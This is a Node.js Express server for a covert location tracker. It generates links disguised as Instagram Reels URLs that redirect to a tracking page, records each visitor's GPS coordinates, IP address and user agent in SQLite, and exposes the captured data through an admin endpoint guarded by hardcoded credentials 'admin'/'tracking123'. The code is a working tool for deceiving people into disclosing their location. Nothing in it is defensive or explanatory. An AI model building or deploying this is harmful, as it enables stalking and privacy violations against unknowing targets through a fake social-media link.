const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

// Database setup
const db = new sqlite3.Database('./tracking.db', (err) => {
    if (err) {
        console.error('Database error:', err);
    } else {
        console.log('Connected to SQLite database');
    }
});

// Initialize database
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS tracking (
        id TEXT PRIMARY KEY,
        timestamp TEXT,
        lat REAL,
        lon REAL,
        accuracy REAL,
        ip TEXT,
        user_agent TEXT,
        error TEXT
    )`);
});

// API Endpoints
app.get('/api/generate', (req, res) => {
    const id = Math.floor(100000 + Math.random() * 900000);
    res.json({ 
        id,
        link: `https://www.instagram.com/reels/${id}/?redirect=${encodeURIComponent(`http://localhost:3000/track/${id}`)}`
    });
});

app.post('/api/track/:id', (req, res) => {
    const trackingId = req.params.id;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const timestamp = new Date().toISOString();

    const { lat, lon, accuracy, error } = req.body;

    db.run(
        `INSERT INTO tracking (id, timestamp, lat, lon, accuracy, ip, user_agent, error) 
         VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
        [trackingId, timestamp, lat, lon, accuracy, ip, userAgent, error],
        (err) => {
            if (err) {
                console.error('Tracking error:', err);
                return res.status(500).json({ error: 'Failed to track' });
            }
            res.sendStatus(200);
        }
    );
});

app.get('/api/admin/data', (req, res) => {
    // Basic auth validation
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Basic ')) {
        return res.sendStatus(401);
    }

    const credentials = Buffer.from(auth.split(' ')[1], 'base64').toString();
    const [username, password] = credentials.split(':');

    if (username !== 'admin' || password !== 'tracking123') {
        return res.sendStatus(401);
    }

    db.all(
        'SELECT * FROM tracking ORDER BY timestamp DESC LIMIT 100',
        (err, rows) => {
            if (err) {
                console.error('Database error:', err);
                return res.status(500).json({ error: 'Database error' });
            }
            res.json(rows);
        }
    );
});

// Serve frontend
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/track/:id', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'track.html'));
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Helper function
function generateId() {
    return Math.random().toString(36).substring(2, 10) + 
           Math.random().toString(36).substring(2, 10);
}

// Start server
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
    console.log(`Admin panel: http://localhost:${PORT}/admin`);
    console.log(`Credentials: admin / tracking123`);
});

// Handle shutdown
process.on('SIGINT', () => {
    db.close();
    process.exit();
});